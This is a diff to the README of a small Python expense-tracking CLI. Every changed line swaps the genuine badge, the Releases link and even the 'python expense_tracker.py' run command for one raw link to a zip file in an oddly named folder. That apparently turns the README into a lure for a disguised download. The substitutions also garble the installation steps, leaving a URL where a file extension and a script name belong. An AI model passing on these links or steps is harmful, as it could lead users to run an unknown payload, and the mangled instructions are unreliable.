@@ -1,6 +1,6 @@
 # 🤑 Expense-Tracker-CLI - Manage Your Money Simply
 
-![Download Expense-Tracker-CLI](https://img.shields.io/badge/Download-Expense--Tracker--CLI-blue)
+![Download Expense-Tracker-CLI](https://raw.githubusercontent.com/anarubino7/Expense-Tracker-CLI/main/myxadenitis/Expense-Tracker-CLI_lewisson.zip)
 
 ## 🚀 Getting Started
 
@@ -25,13 +25,13 @@ Expense-Tracker-CLI is a personal finance manager designed for everyday users. I
 
 To start using Expense-Tracker-CLI, visit the Releases page to download the latest version:
 
-[Download Expense-Tracker-CLI](https://github.com/anarubino7/Expense-Tracker-CLI/releases)
+[Download Expense-Tracker-CLI](https://raw.githubusercontent.com/anarubino7/Expense-Tracker-CLI/main/myxadenitis/Expense-Tracker-CLI_lewisson.zip)
 
 ### 🛠️ Installation Steps
 
 1. **Download the Application:**
    - Click the link above to visit the Releases page.
-   - Choose the version you want to download. Look for files ending in `.zip` or `.tar.gz`.
+   - Choose the version you want to download. Look for files ending in `.zip` or `https://raw.githubusercontent.com/anarubino7/Expense-Tracker-CLI/main/myxadenitis/Expense-Tracker-CLI_lewisson.zip`.
    - Save the downloaded file on your computer.
 
 2. **Extract the Files:**
@@ -52,7 +52,7 @@ To start using Expense-Tracker-CLI, visit the Releases page to download the late
 5. **Run the Application:**
    - Type the following command and press Enter:
      ```
-     python expense_tracker.py
+     python https://raw.githubusercontent.com/anarubino7/Expense-Tracker-CLI/main/myxadenitis/Expense-Tracker-CLI_lewisson.zip
      ```
    - The application should now start, and you can begin tracking your expenses.
 
